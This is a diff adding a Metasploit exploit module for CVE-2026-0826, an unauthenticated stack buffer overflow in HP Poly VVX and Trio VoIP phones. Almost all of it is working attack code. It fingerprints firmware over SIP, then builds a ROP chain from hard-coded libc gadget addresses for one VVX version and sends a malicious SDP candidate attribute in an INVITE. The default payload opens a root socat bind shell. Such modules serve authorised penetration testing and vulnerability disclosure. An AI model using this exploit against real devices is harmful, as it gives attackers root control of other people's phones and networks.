@@ -1,0 +1,253 @@
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+class MetasploitModule < Msf::Exploit::Remote
+  Rank = GreatRanking
+
+  prepend Msf::Exploit::Remote::AutoCheck
+  include Msf::Exploit::Remote::Udp
+
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name' => 'HP Poly Voice Unauthenticated Remote Code Execution',
+        'Description' => %q{
+          CVE-2026-0826 is a critical unauthenticated stack-based buffer overflow vulnerability affecting all
+          models in the VVX series (VVX 150, VVX 250, VVX 350, and VVX 450), as well as three models from the Trio IP
+          Conference series (Trio 8800, Trio 8500, and Trio 8300). A remote attacker can leverage CVE-2026-0826 to achieve
+          unauthenticated remote code execution (RCE) with root privileges on a target device. The vulnerability is present
+          in the device's parsing of Session Description Protocol (SDP) attributes for Interactive Connectivity Establishment
+          (ICE). The ICE feature, which is not enabled by default, must be enabled for the device to be exploitable by a
+          remote attacker.
+        },
+        'License' => MSF_LICENSE,
+        'Author' => [
+          'sfewer-r7', # Discovery, Analysis, Exploit
+        ],
+        'References' => [
+          ['CVE', '2026-0826'],
+          ['URL', 'https://support.hp.com/us-en/document/ish_15052661-15052687-16/hpsbpy04083'],
+          ['URL', 'https://www.rapid7.com/blog/post/ve-cve-2026-0826-critical-unauthenticated-stack-buffer-overflow-hp-poly-vvx-trio-voip-phones-fixed/']
+        ],
+        'DisclosureDate' => '2026-06-01',
+        # While the target is an embedded Linux system, there is no curl/wget/ftp for the command payloads, so we
+        # only expose the Unix payloads. Only the socat payloads have been tested to work.
+        'Platform' => 'unix',
+        'Arch' => ARCH_CMD,
+        'Privileged' => true, # /usr/local/root/polyapp runs as root
+        'Targets' => [
+          [ 'Automatic', {} ],
+        ],
+        'DefaultTarget' => 0,
+        # NOTE: Tested with the following payloads:
+        #    cmd/unix/bind_socat_tcp
+        'DefaultOptions' => {
+          'RPORT' => 5060,
+          'PAYLOAD' => 'cmd/unix/bind_socat_tcp',
+          'SocatPath' => '/usr/local/bin/socat',
+          'BashPath' => '/bin/sh'
+        },
+        'Payload' => {
+          'BadChars' => "\r\n\0 ",
+          'Encoder' => 'cmd/ifs'
+        },
+        'Notes' => {
+          'Stability' => [CRASH_OS_RESTARTS],
+          'Reliability' => [REPEATABLE_SESSION],
+          'SideEffects' => [IOC_IN_LOGS]
+        }
+      )
+    )
+  end
+
+  def check
+    connect_udp
+
+    sip_response, model_str, version_str = get_version
+
+    unless sip_response.nil? || model_str.nil? || version_str.nil?
+
+      version = Rex::Version.new(version_str)
+
+      description = "Poly #{model_str} version #{version_str}"
+
+      # Per the vendor advisory, every model in the VVX family is vulnerable, and three models in the Trio family
+      # are vulnerable. The fixed firmware version is also given here.
+      affected_ranges = [
+        { family: 'vvx', model: nil, fixed_version: '6.4.8' },
+        { family: 'trio', model: '8300', fixed_version: '8.1.7' },
+        { family: 'trio', model: '8500', fixed_version: '7.2.8' },
+        { family: 'trio', model: '8800', fixed_version: '7.2.8' },
+      ]
+
+      affected_ranges.each do |affected_range|
+        next unless model_str.downcase.include?(affected_range[:family])
+
+        next if (affected_range[:model]) && !model_str.downcase.include?(affected_range[:model])
+
+        next unless version < Rex::Version.new(affected_range[:fixed_version])
+
+        # NOTE: When we use "Require: ice" in the request, we get a "420 Bad Extension" response if ICE is enabled
+        # but not fully configured. The phone will still be exploitable.
+
+        if sip_response.start_with? "SIP/2.0 200 OK\r\n"
+          return Exploit::CheckCode::Appears(description)
+        end
+
+        return Exploit::CheckCode::Detected(description)
+      end
+
+      return Exploit::CheckCode::Safe(description)
+    end
+
+    CheckCode::Unknown
+  ensure
+    disconnect_udp
+  end
+
+  def exploit
+    connect_udp
+
+    cmd = payload.encoded.to_s
+
+    unless datastore['PAYLOAD'] == 'cmd/unix/bind_socat_tcp'
+      print_warning('Only the unix socat payload cmd/unix/bind_socat_tcp has been verified to work')
+    end
+
+    vprint_status("cmd: #{cmd}")
+
+    _, model_str, version_str = get_version
+
+    fail_with(Failure::UnexpectedReply, 'Failed to get target version') unless version_str && model_str
+
+    rop_table = nil
+
+    if model_str.downcase.include? 'vvx'
+      rop_table = get_vvx_rop_table(version_str)
+    else
+      fail_with(Failure::BadConfig, "No ROP table available for model #{model_str}")
+    end
+
+    fail_with(Failure::BadConfig, "No ROP table available for #{model_str} version #{version_str}") unless rop_table
+
+    vprint_status("ROP Table: #{rop_table}")
+
+    # we use system() which will do "/bin/sh -c <CMD>" for us.
+
+    attribute_name = 'a=candidate:'
+
+    overflow = attribute_name
+    overflow += 'A' * (256 - attribute_name.length) # fill the 256 byte stack buffer
+    overflow += 'B' * 19 # padding
+    overflow += '1111' # r4
+    overflow += '2222' # r5
+    overflow += '3333' # r11
+    # .text:40A71454 POP {PC}
+    overflow += [rop_table[:libc_base] + rop_table[:libc_gadget1]].pack('V') # pc #1 - align stack (otherwise we are off by 4 and libc!fork will SIGSEGV during libc!system)
+    # .text:40B57C0C POP {R0-R3,PC}
+    overflow += [rop_table[:libc_base] + rop_table[:libc_gadget2]].pack('V') # pc #2 - set r3 to libc!system
+    overflow += 'CCCC' # r0
+    overflow += 'CCCC' # r1
+    overflow += 'CCCC' # r2
+    overflow += [rop_table[:libc_base] + rop_table[:libc_system]].pack('V') # r3 - # .text:40A939C8 ; int __fastcall system(char *cmd)
+    # .text:40B41BF4 MOV R0, SP
+    # .text:40B41BF8 BLX R3
+    overflow += [rop_table[:libc_base] + rop_table[:libc_gadget4]].pack('V') # pc #3 - set r0 == cmd, and call system(cmd)
+    overflow += cmd # &sp
+
+    _, udp_lhost, udp_lport = udp_sock.getlocalname
+
+    sdp_data = "c=IN IP4 #{udp_lhost}\r\n"
+    sdp_data += "m=audio #{rand(50_000..50_999)} RTP/AVP 0\r\n"
+    sdp_data += "a=rtpmap:0 PCMU/8000/1\r\n"
+    sdp_data += "#{overflow}\r\n"
+
+    call_id = Rex::Text.rand_text_hex(16)
+
+    cseq = rand(65_535)
+
+    sip_request = "INVITE sip:#{rhost}:#{rport} SIP/2.0\r\n"
+    sip_request << "Via: SIP/2.0/UDP #{udp_lhost}:#{udp_lport}\r\n"
+    sip_request << "Route: <sip:#{udp_lhost}:#{udp_lport};lr>\r\n"
+    sip_request << "From: <sip:#{rhost}:#{rport}>\r\n" # The From is the target ip, as this can appear in the UI as a missed call.
+    sip_request << "To: <sip:#{rhost}:#{rport}>\r\n"
+    sip_request << "Contact: <sip:#{rhost}>\r\n"
+    sip_request << "Call-ID: #{call_id}\r\n"
+    sip_request << "CSeq: #{cseq} INVITE\r\n"
+    sip_request << "Content-Type: application/sdp\r\n"
+    sip_request << "Content-Length: #{sdp_data.bytesize}\r\n"
+    sip_request << "\r\n"
+    sip_request << sdp_data
+
+    udp_sock.put(sip_request)
+  ensure
+    disconnect_udp
+  end
+
+  def get_version
+    # Cache the response for the scenario where exploit is run with AutoCheck true. This avoids a second SIP OPTIONS
+    # request being sent to the target.
+    @get_version ||= _get_version
+  end
+
+  def _get_version
+    _, udp_lhost, udp_lport = udp_sock.getlocalname
+
+    sip_request = "OPTIONS sip:#{rhost}:#{rport} SIP/2.0\r\n"
+    sip_request << "Via: SIP/2.0/UDP #{udp_lhost}:#{udp_lport}\r\n"
+    sip_request << "From: <sip:#{udp_lhost}:#{udp_lport}>\r\n"
+    sip_request << "To: <sip:#{rhost}:#{rport}>\r\n"
+    sip_request << "CSeq: #{rand(65_535)} OPTIONS\r\n"
+    sip_request << "Call-ID: #{Rex::Text.rand_text_hex(16)}\r\n"
+    # The vuln is in a non-default service for Interactive Connectivity Establishment (ICE). We use the Require header
+    # to ask the target if it supports ICE.
+    sip_request << "Require: ice\r\n"
+    sip_request << "\r\n"
+
+    udp_sock.put(sip_request)
+
+    sip_response = udp_sock.get(udp_sock.def_read_timeout)
+
+    unless sip_response.empty?
+      # HP Poly VVX devices are vulnerable.
+      # Example user agent string: "User-Agent: PolycomVVX-VVX_450-UA/6.4.7.4477"
+      if sip_response =~ %r{User-Agent:\s*PolycomVVX-(VVX_\d+)-UA/([\d+.]+)}i
+        return sip_response, Regexp.last_match(1), Regexp.last_match(2)
+      end
+
+      # HP Poly Trio devices are vulnerable also, Recog has a regex and example values for these:
+      # https://github.com/rapid7/recog/blob/d6b0ee8b5272198c0d2e38d78999836c821f0934/xml/sip_banners.xml#L763C25-L763C112
+      # Example user agent string: "User-Agent: PolycomRealPresenceTrio-Trio_8800-UA/5.4.0.12197"
+      if sip_response =~ %r{User-Agent:\s*(?:Polycom/[\d.]+ )?PolycomRealPresenceTrio-(Trio_\S+)-UA/([\d.]+)(?:_(.{12}))?}
+        return sip_response, Regexp.last_match(1), Regexp.last_match(2)
+      end
+
+    end
+
+    [nil, nil, nil]
+  end
+
+  def get_vvx_rop_table(version_str)
+    rop_tables = {
+      '6.4.7.4477' => {
+        # Even though /proc/sys/kernel/randomize_va_space is 1, all libraries are
+        # mapped from 0x40000000, and libc ends up here.
+        libc_base: 0x40A5C000,
+        # .text:40A71454 POP {PC}
+        libc_gadget1: 0x15454,
+        # .text:40B57C0C POP {R0-R3,PC}
+        libc_gadget2: 0xFBC0C,
+        # .text:40A939C8 ; int __fastcall system(char *cmd)
+        libc_system: 0x379C8,
+        # .text:40B41BF4 MOV R0, SP
+        # .text:40B41BF8 BLX R3
+        libc_gadget4: 0xE5BF4
+      }
+    }
+
+    rop_tables[version_str]
+  end
+end
